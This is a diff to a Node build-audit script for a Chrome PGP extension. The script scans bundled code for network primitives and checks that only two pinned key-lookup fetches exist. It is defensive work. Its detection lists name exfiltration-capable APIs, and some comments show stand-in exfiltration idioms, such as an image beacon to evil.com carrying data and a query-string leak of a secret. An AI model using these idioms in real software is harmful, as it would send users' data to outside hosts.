@@ -1,121 +1,39 @@
 #!/usr/bin/env node
-// ──────────────────────────────────────────────────────────────────────
-// audit-network.mjs — AST-based post-build supply-chain guard
+// audit-network.mjs — AST-based post-build supply-chain guard.
 //
-// Parses every SCRIPT file in the build output with Babel, walks the AST
-// for network-capable constructs, and checks the result against a
-// PER-CONTEXT census with EXACT counts. There are two contexts and they
-// get different promises:
+// Parses every script in the build output and checks network-capable
+// constructs against a PER-CONTEXT census with EXACT counts:
+//   worker  exactly two `fetch` calls, each statically resolved to one pinned
+//           origin with a pinned init shape (SECURITY.md §7, §13;
+//           T-GITHUB-LOOKUP-DISCLOSURE, T-KEYSERVER-LOOKUP-DISCLOSURE).
+//   page    no remote-destination fetch, no XHR/WebSocket/etc., and no
+//           absolute URL literal outside a pinned set.
+// Counts are exact so deleting a guard fails as loudly as adding a leak; if a
+// real change moves them, re-pin here in the same commit and say why.
 //
-//   worker (the manifest's background.service_worker)
-//     Exactly two `fetch` CALL sites beyond the lockdown's own reference.
-//     Each call's DESTINATION is resolved statically through the bundle
-//     (parameter → unique call site → `new URL(path, origin)` → literal)
-//     and must come out as one of the two pinned origins — ONE CALL SITE
-//     EACH, so a second GitHub fetch cannot occupy the keyserver's slot;
-//     each init object must match a pinned shape exactly. They are the
-//     GitHub SSH-key lookup and the keys.openpgp.org certificate lookup
-//     (SECURITY.md §7, §13; T-GITHUB-LOOKUP-DISCLOSURE,
-//     T-KEYSERVER-LOOKUP-DISCLOSURE).
+// NOT proven: aliasing (`const f = fetch`) is the runtime lockdown's job
+// (src/lib/network-lockdown.ts); URL checks are a change detector that misses
+// hosts assembled from fragments without "://"; the resolver is bounded
+// single-file constant propagation and errors rather than guesses. Chrome's
+// built-in AI APIs are browser-mediated and invisible here — see
+// T-AI-AUDIT-BLINDSPOT and T-AI-TRANSLATE-METADATA.
 //
-//   page (every other script — side panel, welcome, shared chunks)
-//     No `fetch` beyond the two wasm loaders, and neither may have a
-//     destination that resolves to a remote origin; no XHR / WebSocket /
-//     EventSource / RTCPeerConnection / sendBeacon / new Worker /
-//     new Function / eval at all; and no absolute URL literal outside a
-//     pinned set of XML namespaces and human-facing href targets.
-//
-// WHY PER-CONTEXT, AND WHY EXACT COUNTS.
-// The previous version had one flat allowlist keyed on a path substring
-// with a `chunks/` wildcard, and NO notion of destination — it flagged
-// `fetch(x)` regardless of what `x` was. Adding a sixth allowlist entry
-// for the GitHub call would have downgraded the guarantee from "no
-// network" to "no unexpected network" and given the panel no separate
-// promise. Worse, it turned out not even to need the sixth entry: the
-// lockdown's own `credentials:"omit"` allowlist entry already covered the
-// new call site, because the call site also passes `credentials: "omit"`.
-// A substring allowlist that broad is not a guard.
-//
-// Counts are exact rather than upper bounds so that DELETING a guard
-// fails as loudly as adding a leak. If a legitimate change moves these
-// numbers, change the numbers here in the same commit and say why.
-//
-// ── WHAT THIS DOES NOT PROVE ──────────────────────────────────────────
-//
-// 1. This scanner catches DIRECT references only. Alias-based evasion
-//    (const f = fetch; f()) is handled at runtime by lib/network-lockdown.ts
-//    which hooks the actual APIs. Together they form defence-in-depth:
-//      - Scanner:  catches obvious additions a dep shouldn't have
-//      - Lockdown: intercepts calls regardless of aliasing/indirection
-//
-// 2. The URL-literal checks are a CHANGE DETECTOR, not a proof. They see
-//    a destination that is SPELLED OUT in the bundle, including one
-//    spelled with escape sequences ("\x68ttps://…") or as a
-//    protocol-relative "//host.tld/…", and they see a split scheme
-//    ("https:" + "//host"). They do NOT see a host assembled from
-//    fragments that never contain "://" ("evil" + "." + "tld"), from
-//    character codes, or from data that is not a literal at all. What the
-//    check buys is that the plain, readable ways to name a remote
-//    destination cannot be added without failing the build. The runtime
-//    layers (CSP, then the lockdown) are what actually stop a request.
-//
-// 3. Destination resolution (§ RESOLVER below) is a bounded, single-file
-//    constant-propagation, not a full dataflow analysis. It follows
-//    unique bindings, single call sites and `new URL(path, base)`. It
-//    proves the ORIGIN the one worker fetch is built from; it does not
-//    prove the path or the query string (see T-GITHUB-CSP-SCOPE), and it
-//    would give up — loudly, as an error — rather than guess if the
-//    bundle shape changed.
-//
-// 4. The panel is NOT "free of network primitives", and this file has
-//    never been able to claim that honestly. The wasm loader is a real
-//    `fetch`, and the lockdown reads `globalThis.fetch` precisely in order
-//    to replace it. The defensible claim is narrower and is the one made
-//    here: THE SIDE PANEL BUNDLE CONTAINS NO CODE THAT CAN NAME A REMOTE
-//    DESTINATION. Its two fetches take an extension-relative URL (checked:
-//    neither resolves to a remote origin); its absolute URL literals are
-//    XML namespaces and href targets, neither of which is a connect
-//    destination; and `sidepanel.html` pins the panel realm to
-//    `connect-src 'self'` with a meta CSP the browser enforces.
-//
-// 5. SINCE ON-DEVICE TRANSLATION, "no fetch in the panel" AND "the panel
-//    causes no network activity" ARE NO LONGER THE SAME CLAIM, and only
-//    the first is checked here. Chrome's built-in AI APIs
-//    (`Translator`, `LanguageDetector`) are browser-mediated globals, not
-//    network primitives: calling one is invisible to this scanner, does
-//    not traverse lib/network-lockdown.ts, and is not constrained by the
-//    manifest's `connect-src`. But a language-pack download IS real
-//    network activity, performed by Chrome's component updater on the
-//    extension's behalf. The counts below correctly stay at zero for it.
-//    What bounds that traffic is not this file: it is that the download
-//    call lives in exactly one function reachable from exactly one
-//    settings page, behind a preference that is off by default. See
-//    T-AI-AUDIT-BLINDSPOT and T-AI-TRANSLATE-METADATA in
-//    lib/security/threat-model.ts.
-//
-// Usage:  node scripts/audit-network.mjs [output-dir]
-//         Default output-dir: .output/chrome-mv3
-//         --census dumps the observed census instead of judging it,
-//         which is how you re-pin the numbers below after a real change.
-// ──────────────────────────────────────────────────────────────────────
+// Usage:  node scripts/audit-network.mjs [output-dir]   (default .output/chrome-mv3)
+//         --census dumps the observed census, for re-pinning after a real change.
 import { readdirSync, readFileSync, statSync } from "node:fs";
 import { extname, join, posix, relative } from "node:path";
 import { parse } from "@babel/parser";
 import _traverse from "@babel/traverse";
 
-// Handle both ESM default and CJS interop
 const traverse =
   typeof _traverse === "function" ? _traverse : _traverse.default;
 
 const OUTPUT_DIR =
   process.argv.slice(2).find((a) => !a.startsWith("--")) ||
   ".output/chrome-mv3";
-// `--census` rather than an env var: turbo.json declares the env vars the
-// build may read, and that file is not this script's to edit.
+// `--census` rather than an env var: turbo.json pins the env vars the build may read.
 const CENSUS_MODE = process.argv.includes("--census");
 
-// ── Dangerous globals / constructors ────────────────────────────────
-// Direct references to these as identifiers are suspicious.
 const DANGEROUS_GLOBALS = new Set([
   "fetch",
   "XMLHttpRequest",
@@ -127,8 +45,6 @@ const DANGEROUS_GLOBALS = new Set([
   "importScripts",
 ]);
 
-// Property names that are dangerous when called on an object.
-// Only flagged on MemberExpression calls (obj.sendBeacon(), etc.)
 const DANGEROUS_METHODS = new Set([
   "sendBeacon", // navigator.sendBeacon
   "createDataChannel", // RTCPeerConnection.createDataChannel
@@ -138,7 +54,6 @@ const DANGEROUS_METHODS = new Set([
   "addIceCandidate", // RTCPeerConnection.addIceCandidate
 ]);
 
-// Dangerous when used with `new`
 const DANGEROUS_CONSTRUCTORS = new Set([
   "Worker",
   "SharedWorker",
@@ -146,18 +61,8 @@ const DANGEROUS_CONSTRUCTORS = new Set([
   "Image", // new Image().src = "https://evil.com?data=..."
 ]);
 
-// ── The permitted remote origins ────────────────────────────────────
-// The two key-discovery lookups, and nothing else. Note these are the
-// ORIGINS; the manifest CSP narrows each one further to a path prefix
-// (which CSP does honour — verified: /users/<u>/keys is allowed,
-// /gists is blocked).
-//
-// EACH ORIGIN GETS THE SAME TREATMENT, and the checks below are written
-// over the list rather than over one name: exactly one built file may
-// contain the literal, that file must be the worker, and the worker's
-// set of remote origin literals must be exactly this list. A third
-// entry is therefore a deliberate edit in several places, not a
-// one-character change.
+// The two key-discovery origins and nothing else. Exactly one built file (the
+// worker) may contain each; the manifest CSP narrows each to a path prefix.
 const GITHUB_ORIGIN = "https://api.github.com";
 const KEYSERVER_ORIGIN = "https://keys.openpgp.org";
 const WORKER_ORIGINS = [GITHUB_ORIGIN, KEYSERVER_ORIGIN];
@@ -169,45 +74,15 @@ const CONNECT_SRC_PATHS = {
   [KEYSERVER_ORIGIN]: "/vks/v1/",
 };
 
-// ── Contexts ────────────────────────────────────────────────────────
-// The worker file is READ FROM THE MANIFEST (`background.service_worker`)
-// rather than hardcoded, so renaming the entry cannot silently move the
-// worker into the page context — but it must still be the file the census
-// below was pinned against, so a rename fails loudly instead of quietly
-// re-pointing the audit.
-//
-// Treating "page" as "every script that is not the worker" is deliberately
-// blunt: it means a new page entrypoint, or a chunk nobody expected, is
-// held to the panel's promise by default rather than by being listed.
+// The worker file is read from the manifest but must equal this, so a rename
+// fails loudly. Every other script is "page" by default.
 const EXPECTED_WORKER_FILE = "background.js";
 
-// ── Expected primitive census — EXACT counts ────────────────────────
-// Keys are `${kind}:${name}` from the AST scan. Anything observed that is
-// not listed, or listed with a different count, fails the build.
-//
-// worker:
-//   ref:fetch   — `const _fetch = globalThis.fetch` in network-lockdown.ts.
-//                 The lockdown must read the global to replace it; this is
-//                 the reference, not a call.
-//   call:fetch  — TWO, and only two: lib/github/fetch-keys.ts and
-//                 lib/keyserver/fetch-key.ts. Every outbound request this
-//                 extension can make. Counted together, pinned apart —
-//                 see PINNED_CALL_SITES.
-//
-// page:
-//   ref:fetch              — the same single lockdown reference, landing in
-//                            the shared chunk both pages preload.
-//   call:fetch             — exactly two, both wasm loaders (the sidepanel
-//                            entry chunk and the wasm-bindgen glue), each
-//                            fetching an extension-relative URL.
-//   dynamic-import:import() — the code-split import of the local gpg_wasm
-//                            chunk. Its specifier is pinned below.
-//
-// The minifier strips the names off the lockdown's throwing stubs
-// (`function XMLHttpRequest(){throw...}` becomes anonymous), which is why
-// there are no `ref:XMLHttpRequest`-style entries here. Do not "restore"
-// them if a minifier change makes them reappear without checking that the
-// stubs are what produced them.
+// Keys are `${kind}:${name}`; anything unlisted or miscounted fails.
+// worker: ref:fetch is the lockdown reading the global; call:fetch is
+//   src/lib/github/fetch-keys.ts + src/lib/keyserver/fetch-key.ts (pinned apart below).
+// page: the same lockdown ref; two wasm-loader fetches; one gpg_wasm import().
+// Minified lockdown stubs are anonymous, hence no ref:XMLHttpRequest entries.
 const EXPECTED_CENSUS = {
   worker: {
     "ref:fetch": 1,
@@ -220,60 +95,35 @@ const EXPECTED_CENSUS = {
   },
 };
 
-// ── Call-site pinning ───────────────────────────────────────────────
-// Counts alone would let a leak swap places with a legitimate call. Every
-// `call:fetch` and `dynamic-import` finding must ALSO match exactly one of
-// these pins, and every pin must match exactly one finding, so a malicious
-// call cannot inherit a neighbour's budget.
-//
-// A pin may require any of:
-//   snippet          — a substring of the enclosing expression's source.
-//                      WEAK on its own: the snippet spans the whole call,
-//                      so anything the attacker also writes satisfies it.
-//                      Only used where a stronger check is not available.
-//   destinationOrigin — the statically resolved origin of argument 0.
-//                      `null` means "must NOT resolve to a remote origin"
-//                      (an unresolvable or extension-relative destination
-//                      both satisfy that). A string means "must resolve,
-//                      and must be exactly this".
-//   init             — exact shape of the fetch init object: every listed
-//                      key must be present with that literal value, and no
-//                      key outside `init` ∪ `initOptionalKeys` may appear.
+// Every call:fetch / dynamic-import finding must match exactly one pin and
+// vice versa, so a leak cannot inherit a legitimate call's budget.
+//   snippet           substring of the call source (weak; last resort)
+//   destinationOrigin resolved origin of arg 0; null = must NOT be remote
+//   init              exact init shape; no keys beyond init ∪ initOptionalKeys
 const PINNED_CALL_SITES = {
   worker: [
     {
       kind: "call",
       name: "fetch",
-      reason: "lib/github/fetch-keys.ts -- the GitHub SSH-key lookup",
-      // THE pin that matters. `redirect:` used to be it, and it was not a
-      // pin at all: the snippet spans the whole CallExpression, so
-      // `fetch(anythingAtAll, { redirect: "error" })` satisfied it and
-      // inherited this slot in the count. The destination is what the
-      // threat entries actually claim, so the destination is what is
-      // checked — see § RESOLVER.
+      reason: "src/lib/github/fetch-keys.ts -- the GitHub SSH-key lookup",
+      // The destination is the pin that matters (a snippet would match any
+      // call carrying the same options). The init shape keeps no cookies,
+      // no redirect-following, no cache entry.
       destinationOrigin: GITHUB_ORIGIN,
-      // The init object is pinned structurally (AST, not substring) so
-      // the call keeps the properties the security story quotes: no
-      // cookies, no redirect-following, no cache entry.
       init: {
         method: "GET",
         credentials: "omit",
         redirect: "error",
         cache: "no-store",
       },
-      // Non-literal options the call legitimately carries.
       initOptionalKeys: ["signal", "headers"],
     },
     {
       kind: "call",
       name: "fetch",
       reason:
-        "lib/keyserver/fetch-key.ts -- the keys.openpgp.org certificate lookup",
-      // Same pin, different origin. Because a pin must match exactly one
-      // finding AND a finding exactly one pin, the two entries cannot
-      // absorb each other: two fetches to api.github.com leave this pin
-      // unmatched and fail, which is the property a bare count of 2
-      // would not have.
+        "src/lib/keyserver/fetch-key.ts -- the keys.openpgp.org certificate lookup",
+      // One pin per origin: two GitHub fetches leave this one unmatched.
       destinationOrigin: KEYSERVER_ORIGIN,
       init: {
         method: "GET",
@@ -284,12 +134,8 @@ const PINNED_CALL_SITES = {
       initOptionalKeys: ["signal", "headers"],
     },
   ],
-  // Both page fetches are wasm loaders. They are pinned on wasm-bindgen
-  // glue idioms (`arrayBuffer()`, `instance:`) rather than on minified
-  // identifier names, which change on every unrelated code edit — plus the
-  // hard requirement that neither destination resolves to a remote origin.
+  // Pinned on wasm-bindgen glue idioms, not minified names.
   page: [
-    // sidepanel entry chunk: fetch the .wasm blob, then initSync it
     {
       kind: "call",
       name: "fetch",
@@ -297,7 +143,6 @@ const PINNED_CALL_SITES = {
       destinationOrigin: null,
       reason: "sidepanel entry chunk: fetches the extension-local .wasm",
     },
-    // gpg_wasm chunk: the wasm-bindgen init loader
     {
       kind: "call",
       name: "fetch",
@@ -305,7 +150,6 @@ const PINNED_CALL_SITES = {
       destinationOrigin: null,
       reason: "gpg_wasm chunk: the wasm-bindgen init loader",
     },
-    // the code-split import of the local gpg_wasm chunk
     {
       kind: "dynamic-import",
       name: "import()",
@@ -316,42 +160,11 @@ const PINNED_CALL_SITES = {
   ],
 };
 
-// ── Expected absolute URL literals — EXACT sets ─────────────────────
-// Extracted from the raw source rather than the AST, so a fragment left
-// over from string concatenation ("https://" on its own) is still seen.
-//
-// The panel's set is NOT empty, and pretending otherwise would be the
-// dishonest version of this check. What is in it, and why none of it is a
-// connect destination:
-//
-//   http://                      network-lockdown's scheme test
-//                                (`url.startsWith("http://")`), not a URL.
-//   chrome-extension://          network-lockdown's own-origin test, and
-//                                wxt's runtime URL helpers. Not remote.
-//   http://www.w3.org/…          XML/SVG/MathML namespace identifiers.
-//                                These are passed to createElementNS /
-//                                setAttributeNS; nothing ever fetches them.
-//   https://react.dev/errors/    React's minified-error decoder link, put
-//                                into a thrown Error's message.
-//   https://amibeingpwned.com    our own site, rendered as an href.
-//   https://github.com/…         the repo link, rendered as an href.
-//   https://developer.chrome.com/…  a documentation link, rendered as an
-//                                href, next to the CRX signing UI.
-//   chrome://extensions/shortcuts   the browser's own shortcuts page,
-//                                rendered as an href. Not a remote origin
-//                                and not fetchable by a page at all.
-//
-// href targets are inert without a click, and `frame-src 'none'` plus the
-// panel's `connect-src 'self'` meta CSP mean neither the page nor a
-// compromised dependency can turn one into a request. They are listed
-// because the point of this check is that the SET does not grow quietly.
-// The worker also names three Chrome match patterns:
-// `MENU_DOCUMENT_URL_PATTERNS` (lib/context-menu.ts). The menu is created
-// with no `documentUrlPatterns`; whether "Open in PGP Tools" may act is
-// checked when clicked, from the top page's URL, by `menuMayActOn`, which
-// prefix-matches these patterns. They are strings compared against a URL;
-// nothing fetches them, and their host is a wildcard, so they are not a
-// remote origin either.
+// Raw-text scan, so concatenation fragments are seen. Page entries are XML
+// namespaces, href targets, lockdown scheme tests and an error-message link —
+// none a connect destination (connect-src 'self', frame-src 'none'); listed so
+// the set cannot grow quietly. MENU_MATCH_PATTERNS (src/lib/context-menu.ts) are
+// wildcard match patterns compared against a URL, never fetched.
 const MENU_MATCH_PATTERNS = ["http://*/*", "https://*/*", "file:///*"];
 
 const EXPECTED_URL_LITERALS = {
@@ -373,36 +186,20 @@ const EXPECTED_URL_LITERALS = {
     "https://developer.chrome.com/docs/webstore/update#protect-package-updates",
     "https://github.com/Am-I-Being-Pwned/PGP-Tools",
     "chrome://extensions/shortcuts",
-    // date-fns embeds this doc link in the message it throws when a
-    // format string uses a Unicode token. Never fetched; never rendered.
+    // date-fns error-message doc link; never fetched or rendered.
     "https://github.com/date-fns/date-fns/blob/master/docs/unicodeTokens.md",
   ],
 };
 
-// ── Manifest policy — EXACT ─────────────────────────────────────────
-// The permission arrays are checked as exact SETS, not by denylist. A
-// denylist has to guess what a future Chrome adds; an exact set fails on
-// anything at all appearing, including the ones nobody thought of. Every
-// entry here is one the extension actually uses:
-//
-//   sidePanel      the whole UI is a side panel
-//   contextMenus   right-click → encrypt/decrypt entries
-//   storage        the local vault (chrome.storage.local)
-//   idle           auto-lock on idle
-//   downloads      (optional) "save decrypted file", requested on demand;
-//                  the FSA save picker crashes the side panel, so this is
-//                  the only way to hand a user a file
-//
-// NOTE the network-capable ones that are therefore forbidden by
-// construction: declarativeNetRequest (rewrite/redirect any request),
-// webRequest, nativeMessaging (a pipe to a local binary, outside every
-// CSP), proxy, debugger, scripting/tabs/cookies (read other origins).
+// Exact SETS, not a denylist, so anything new fails. downloads is optional
+// because the FSA save picker crashes the side panel. Network-capable
+// permissions (DNR, webRequest, nativeMessaging, proxy, debugger, scripting,
+// tabs, cookies) are therefore forbidden by construction.
 const EXPECTED_PERMISSIONS = ["sidePanel", "contextMenus", "storage", "idle"];
 const EXPECTED_OPTIONAL_PERMISSIONS = ["downloads"];
 
-// Manifest keys that must be ABSENT, with the reason each one matters.
-// "Absent", not "empty": a build step that adds one of these is close to
-// invisible in a review of a generated manifest diff.
+// Must be ABSENT, not merely empty — an added key is near-invisible in a
+// generated manifest diff.
 const FORBIDDEN_MANIFEST_KEYS = {
   host_permissions:
     "the GitHub lookup is unauthenticated CORS and needs no host permission; a host permission attaches the user's cookies-and-all origin privileges to a request we deliberately make anonymous",
@@ -420,9 +217,6 @@ const FORBIDDEN_MANIFEST_KEYS = {
     "no extension resource is exposed to web origins; a WAR page is loadable (and framable) by any site that matches",
 };
 
-// ── Collect files ───────────────────────────────────────────────────
-// Everything in the output, relative and posix-normalised so it can be
-// compared against manifest/HTML references directly.
 function collectFiles(dir, base = dir) {
   const files = [];
   for (const entry of readdirSync(dir)) {
@@ -436,14 +230,8 @@ function collectFiles(dir, base = dir) {
   return files;
 }
 
-// ── File classification ─────────────────────────────────────────────
-// Derived from the build output and the manifest rather than from a
-// hardcoded ".js and .css" list. The old version scanned exactly those two
-// extensions, so a chunk emitted as `.mjs` — or a manifest-referenced
-// script with any other extension — was invisible to BOTH the census and
-// the URL scan. The rule now is the other way round: a file is inert only
-// if its extension is on the list below, and everything else is parsed as
-// script (and fails the build if it will not parse).
+// A file is inert only if its extension is listed; everything else is parsed
+// as script and fails the build if it will not parse.
 const INERT_EXTENSIONS = new Set([
   ".png",
   ".jpg",
@@ -483,8 +271,6 @@ function classifyFiles(allFiles, referencedScripts) {
   return { scripts, css, html, inert };
 }
 
-// Resolve a reference (manifest paths are root-relative; HTML `src` may be
-// root-relative or relative to the page) to an output-relative path.
 function resolveRef(ref, fromFile = "") {
   const clean = ref.split("?")[0].split("#")[0];
   if (/^[a-z][a-z0-9+.-]*:/i.test(clean) || clean.startsWith("//")) return null;
@@ -541,43 +327,22 @@ function htmlInlineScripts(html) {
   );
 }
 
-// ── Extract source snippet around a node ────────────────────────────
 function snippetAt(source, node, contextChars = 80) {
   const start = Math.max(0, node.start - 10);
   const end = Math.min(source.length, node.end + contextChars);
   return source.slice(start, end);
 }
 
-// ── Absolute URL literals ───────────────────────────────────────────
-// Deliberately scans raw text, not string-literal AST nodes: a fragment
-// that is being concatenated is exactly what we want to see.
-//
-// Three patterns, because one regex over the raw bytes is escapable in
-// three cheap ways and all three are worth closing:
-//
-//   SCHEME_URL_RE       any `scheme://host…`, not just http(s) — so
-//                       `ws://`, `blob:`-lookalikes and `chrome-extension://`
-//                       all land in the pinned set rather than under it.
-//   PROTO_RELATIVE_RE   `"//evil.tld/x"` — a real destination with no
-//                       scheme at all, which the old http(s)-only regex
-//                       could not see. Anchored to a quote and required to
-//                       look like a hostname, so `a // b` and comments do
-//                       not match.
-//   SPLIT_SCHEME_RE     `"https:" + "//" + host` — the scheme half of a
-//                       split URL, recorded as the token `https:`.
-//
-// Each is run over the raw source AND over a copy with JS string escapes
-// decoded, so `"\x68ttps://evil.tld"` and `"https://evil.tld"` are
-// caught too. What remains open, and is documented as open: a host built
-// from fragments that never contain `://` or a leading `//`.
+// Raw text, not AST literals, so concatenation fragments are seen. Three
+// patterns: any `scheme://`, protocol-relative `"//host.tld"`, and a split
+// `"https:" + "//"`. Each runs over raw and escape-decoded source. Still open:
+// a host built from fragments with no `://` or leading `//`.
 const SCHEME_URL_RE = /[a-z][a-z0-9+.-]{1,31}:\/\/[^"'`\s\\)>]*/gi;
 const PROTO_RELATIVE_RE =
   /["'`](\/\/[a-z0-9-]+(?:\.[a-z0-9-]+)+[^"'`\s\\)>]*)/gi;
 const SPLIT_SCHEME_RE = /["'`](https?:)(?!\/\/)/gi;
 
-// Decode the escape forms that can spell an ASCII character inside a JS
-// string literal. Length is not preserved (offsets are not used for URL
-// findings, only the matched text is reported).
+// Decode JS string escapes that can spell ASCII; only matched text is used.
 function decodeStringEscapes(source) {
   return source
     .replace(/\\x([0-9a-fA-F]{2})/g, (_, h) =>
@@ -609,10 +374,7 @@ function urlLiteralsIn(source) {
   return [...found];
 }
 
-// ── Module specifiers ───────────────────────────────────────────────
-// Used only to assert that the worker bundle is self-contained. If Vite
-// ever hoists worker code into a shared chunk, the single-file check on the
-// GitHub origin literal stops meaning what it says — so fail there first.
+// Worker bundle must be self-contained, or the single-file origin check is meaningless.
 const MODULE_SPECIFIER_RE = /\b(?:from|import)\s*["']([^"']+)["']/g;
 
 function moduleSpecifiersIn(source) {
@@ -620,27 +382,11 @@ function moduleSpecifiersIn(source) {
   return [...source.matchAll(MODULE_SPECIFIER_RE)].map((m) => m[1]);
 }
 
-// ── RESOLVER: what destination can this call actually name? ─────────
-// A bounded constant-propagation over one file's AST. It exists because
-// the worker pin used to be the substring `redirect:` on a snippet that
-// spanned the whole call — which made the assertion "one fetch whose init
-// mentions redirect", not "one fetch to api.github.com".
-//
-// It follows, at most RESOLVE_DEPTH steps:
-//   - string and template literals (the static head of a template)
-//   - `a + b`  → the left operand (the scheme/origin end of a concat)
-//   - an identifier → its unique binding: an initialiser, or a single
-//     assignment to a declared-then-assigned `let`
-//   - a parameter → the argument at that index, IF the enclosing function
-//     has exactly one call site in the file
-//   - a call of a local function with exactly one `return` → that return
-//     expression, with the callee's parameters bound to this call's args
-//   - `new URL(path, base)` → base, which is what fixes the origin
-//
-// It gives up (returns null) on anything else: two call sites, a
-// conditional, a computed member, a value from another module. Giving up
-// is not a pass — the worker pin REQUIRES a resolved origin, so a bundle
-// shape this cannot follow fails the build and asks to be re-derived.
+// ── RESOLVER ────────────────────────────────────────────────────────
+// Bounded constant propagation over one file's AST: literals, template heads,
+// left operand of `+`, unique bindings, a param via its single call site, a
+// local function's single return, and `new URL(path, base)` → base.
+// Anything else returns null, which FAILS a pin requiring an origin.
 const RESOLVE_DEPTH = 16;
 
 function callSitesOf(fnPath) {
@@ -713,7 +459,6 @@ function resolveStatic(path, env, depth, seen) {
         const index = fnPath.node.params.indexOf(binding.path.node);
         if (index < 0) return null;
         const sites = callSitesOf(fnPath);
-        // More than one call site: the argument is not a constant here.
         if (sites.length !== 1) return null;
         const args = sites[0].get("arguments");
         return resolveStatic(args[index], new Map(), depth + 1, seen);
@@ -789,9 +534,7 @@ function originOf(value) {
   if (!/^[a-z][a-z0-9+.-]*:\/\//i.test(candidate)) return null;
   try {
     const url = new URL(candidate);
-    // Schemes that cannot reach the network off-device. `chrome:` and the
-    // extension schemes are local surfaces; blob:/data:/filesystem: carry
-    // their payload with them.
+    // Local surfaces, or schemes that carry their payload with them.
     if (LOCAL_SCHEMES.has(url.protocol)) return null;
     return url.origin;
   } catch {
@@ -799,8 +542,6 @@ function originOf(value) {
   }
 }
 
-// The fetch init object, read structurally. Returns
-// { keys, values } where values holds only statically-known strings.
 function readInitObject(callPath) {
   const arg = callPath.get("arguments")[1];
   if (!arg || !arg.node || arg.node.type !== "ObjectExpression") return null;
@@ -858,30 +599,25 @@ function scanFile(source, relPath, contextOf) {
   }
 
   traverse(ast, {
-    // ── Calls: fetch(), navigator.sendBeacon(), window["fetch"]() ──
     CallExpression(path) {
       const callee = path.node.callee;
 
-      // eval()
       if (callee.type === "Identifier" && callee.name === "eval") {
         addFinding("eval", "eval", path);
         return;
       }
 
-      // Dynamic import(): import("https://evil.com/x.js")
-      // Babel parses this as CallExpression with callee type "Import"
+      // Babel parses import() as a CallExpression with callee type "Import".
       if (callee.type === "Import") {
         addFinding("dynamic-import", "import()", path);
         return;
       }
 
-      // Direct identifier call: fetch(), XMLHttpRequest(), etc.
       if (callee.type === "Identifier" && DANGEROUS_GLOBALS.has(callee.name)) {
         addFinding("call", callee.name, path);
         return;
       }
 
-      // Method call: obj.sendBeacon(), obj.createDataChannel(), obj.fetch()
       if (
         callee.type === "MemberExpression" &&
         !callee.computed &&
@@ -894,7 +630,6 @@ function scanFile(source, relPath, contextOf) {
         }
       }
 
-      // Computed property calls: window["fetch"](), obj["sendBeacon"]()
       if (
         callee.type === "MemberExpression" &&
         callee.computed &&
@@ -907,7 +642,6 @@ function scanFile(source, relPath, contextOf) {
       }
     },
 
-    // ── new X(): new WebSocket(), new Worker(), new Function() ──────
     NewExpression(path) {
       const callee = path.node.callee;
       let name = null;
@@ -930,27 +664,20 @@ function scanFile(source, relPath, contextOf) {
       }
     },
 
-    // ── Dynamic import() — ImportExpression variant ─────────────────
     ImportExpression(path) {
       addFinding("dynamic-import", "import()", path);
     },
 
-    // ── Bare references: const x = fetch (not a call, but captures it) ──
-    // Catches alias setup: const f = fetch, const f = globalThis.fetch
-    // These are flagged as "ref" so the census can distinguish them
-    // from actual calls.
+    // Bare references (aliasing: `const f = fetch`) are counted as "ref".
     Identifier(path) {
       if (!DANGEROUS_GLOBALS.has(path.node.name)) return;
 
-      // Skip if this identifier is being called (handled by CallExpression)
-      // or constructed (handled by NewExpression)
       const parent = path.parent;
       if (parent.type === "CallExpression" && parent.callee === path.node)
         return;
       if (parent.type === "NewExpression" && parent.callee === path.node)
         return;
 
-      // Skip property access keys: obj.fetch (the "fetch" on the right)
       if (
         parent.type === "MemberExpression" &&
         parent.property === path.node &&
@@ -958,15 +685,12 @@ function scanFile(source, relPath, contextOf) {
       )
         return;
 
-      // Skip object keys: { fetch: value }
       if (parent.type === "ObjectProperty" && parent.key === path.node) return;
 
-      // This is a bare reference — someone is reading the global (likely aliasing)
       addFinding("ref", path.node.name, path, `ref:${path.node.name}`);
     },
 
-    // ── MemberExpression: globalThis.fetch, window.WebSocket ────────
-    // Catches property access on known global carriers
+    // globalThis.fetch / window.WebSocket on known global carriers.
     MemberExpression(path) {
       if (path.node.computed) return;
       if (path.node.property.type !== "Identifier") return;
@@ -974,13 +698,11 @@ function scanFile(source, relPath, contextOf) {
       const prop = path.node.property.name;
       if (!DANGEROUS_GLOBALS.has(prop)) return;
 
-      // Skip if parent is already a CallExpression (handled above)
       const parent = path.parent;
       if (parent.type === "CallExpression" && parent.callee === path.node)
         return;
 
       const obj = path.node.object;
-      // Only flag on known global carriers
       if (
         obj.type === "Identifier" &&
         (obj.name === "globalThis" ||
@@ -1007,10 +729,7 @@ function scanFile(source, relPath, contextOf) {
   return { findings, parseError: null };
 }
 
-// ── CSS scanner ─────────────────────────────────────────────────────
-// Catches exfiltration via url(), @import, @font-face pointing externally.
-// CSP img-src/font-src blocks these at runtime, but we flag them at build
-// time too so a malicious dep can't rely on a future CSP loosening.
+// External url()/@import in CSS; CSP blocks these too, but don't rely on it staying so.
 const EXTERNAL_URL_RE = /url\(\s*["']?(https?:\/\/|\/\/)/gi;
 const IMPORT_RE = /@import\s+(?:url\()?["']?(https?:\/\/|\/\/)/gi;
 
@@ -1038,11 +757,7 @@ function scanCssFile(source, relPath, contextOf) {
   return findings;
 }
 
-// ── Manifest / HTML validator ───────────────────────────────────────
-// Ensures the built manifest.json still carries the policy the audit
-// story rests on. A malicious build plugin could strip or weaken any of
-// it, and a generated manifest is exactly the kind of file a reviewer
-// skims rather than reads.
+// The built manifest must still carry the policy the audit rests on.
 function validateManifest(outputDir, manifest) {
   const errors = [];
   if (!manifest) return ["manifest.json not found or invalid"];
@@ -1050,8 +765,7 @@ function validateManifest(outputDir, manifest) {
   const cspBlock = manifest.content_security_policy ?? {};
   const csp = cspBlock.extension_pages ?? "";
 
-  // Each directive must contain at least one of the acceptable tokens.
-  // 'none' is strictly stronger than 'self' and always acceptable.
+  // 'none' is strictly stronger than 'self'.
   const required = [
     ["default-src", ["'self'", "'none'"]],
     ["script-src", ["'self'"]],
@@ -1075,17 +789,9 @@ function validateManifest(outputDir, manifest) {
     }
   }
 
-  // connect-src must be EXACTLY the extension origin plus the two
-  // path-prefixed lookup endpoints, in this order. Not a substring test:
-  // `'self' https://api.github.com/` (no path) or a third origin appended
-  // would both pass a containment check and both widen the worker's
-  // reach.
-  //
-  // CSP path-prefix matching is real and was measured: with this policy
-  // /users/<u>/keys returns 200 and /gists is blocked. What it does NOT
-  // constrain is the query string — /users/x/keys?leak=SECRET is allowed
-  // (measured). That residual is inherent to CSP and is recorded as
-  // T-GITHUB-CSP-SCOPE rather than papered over here.
